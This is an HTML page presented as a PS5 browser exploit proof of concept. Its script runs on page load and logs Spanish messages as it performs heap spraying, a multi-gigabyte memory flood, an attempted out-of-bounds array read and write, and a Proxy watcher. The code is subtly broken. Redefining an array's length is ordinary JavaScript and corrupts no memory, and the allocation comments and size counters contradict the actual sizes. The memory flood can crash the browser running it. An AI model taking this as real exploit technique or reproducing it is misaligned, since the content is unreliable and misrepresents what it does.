<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>💥 PS5 Exploit PoC: Grooming + OOB</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      white-space: pre-wrap;
      padding: 1em;
    }
  </style>
</head>
<body>
  <h1>💥 PS5 Exploit PoC: Grooming + OOB</h1>
  <pre id="log">[LOG]\n</pre>

  <script>
    const logElem = document.getElementById("log");
    function print(msg) {
      console.log(msg);
      logElem.textContent += msg + "\n";
    }

    function memoryFloodLite() {
      print("[1] Saturando parcialmente la memoria...");
      const big = [];
      try {
        for (let i = 0; i < 20; i++) {
          big.push(new Uint8Array(1000_000_000)); // 200 MB total
          if (i % 5 === 0) print(`  + ${i * 1000}MB asignados`);
        }
        print("[+] Memoria saturada parcialmente.");
      } catch (e) {
        print("💥 Error al saturar memoria: " + e);
      }
      return big;
    }

    function groomHeap() {
      print("[2] Realizando heap grooming...");
      let spray = [];
      for (let i = 0; i < 1000; i++) {
        spray.push([13.37, 13.37, 13.37, 13.37]);
      }
      print(`[+] Heap spray completo con ${spray.length} arrays.`);
      return spray;
    }

    function attemptOOB() {
      print("[3] Intentando corrupción OOB...");

      let arr = [1.1, 2.2, 3.3];
      try {
        Object.defineProperty(arr, 'length', { value: 0x1000 });
        print("[+] Length modificado a 0x1000");
      } catch (e) {
        print("[-] No se pudo modificar length: " + e);
      }

      try {
        const leak = arr[0x80];
        print(`[+] arr[0x80] = ${leak}`);
      } catch (e) {
        print("[-] Error al leer fuera de límites: " + e);
      }

      try {
        arr[0x80] = 42.42;
        print("[+] Escrito 42.42 en arr[0x80]");

        const check = arr[0x80];
        print(`[+] Verificado arr[0x80]: ${check}`);
      } catch (e) {
        print("[-] Error al escribir fuera de límites: " + e);
      }
    }

    function setupProxyWatch() {
      print("[4] Activando proxy para detección de accesos...");

      let victim = new Proxy([1.1, 2.2, 3.3], {
        get(target, prop) {
          print(`[Proxy GET] → ${prop}`);
          return target[prop];
        },
        set(target, prop, val) {
          print(`[Proxy SET] → ${prop} = ${val}`);
          target[prop] = val;
          return true;
        }
      });

      victim[1000] = 1234.5678;
      let leak = victim[1000];
      print(`[Proxy] Confirmación arr[1000] = ${leak}`);
    }

    window.onload = () => {
      setTimeout(() => {
        groomHeap();
        memoryFloodLite();
        attemptOOB();
        setupProxyWatch();
      }, 100);
    };
  </script>
</body>
</html>
